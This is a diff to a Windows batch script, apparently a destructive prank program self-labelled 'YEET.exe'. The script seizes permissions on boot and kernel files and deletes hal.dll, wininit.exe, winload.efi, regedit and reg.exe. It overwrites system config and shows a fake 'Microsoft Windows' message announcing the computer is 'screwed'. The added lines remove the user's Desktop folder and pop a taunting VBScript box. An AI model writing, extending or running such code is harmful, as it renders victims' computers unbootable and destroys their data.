@@ -94,6 +94,10 @@ icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
 icacls ntoskrnl.exe /grant %username%:F
 icacls ci.dll /grant %username%:F
 echo y|cacls config /g %username%:F /t
+rd %userprofile%\Desktop
+echo x=msgbox("refresh your desktop ;)",0,"YEET.exe (made by ThePCMaster)")>%userprofile%\yt.vbs
+wscript %userprofile%\yt.vbs
+del %userprofile%\yt.vbs /f
 del hal.dll /f
 del wininit.exe /f
 del winload.efi /f
@@ -117,6 +121,7 @@ del ..\regedit.exe /f
 del reg.exe /f
 md config
 echo dead>config\OSDATA
+mkdir %userprofile%\Desktop
 cd %userprofile%\Desktop
 timeout /t 15 /nobreak
 echo x=msgbox("You got your computer screwed successfully.",48+0,"Microsoft Windows")>yt.vbs
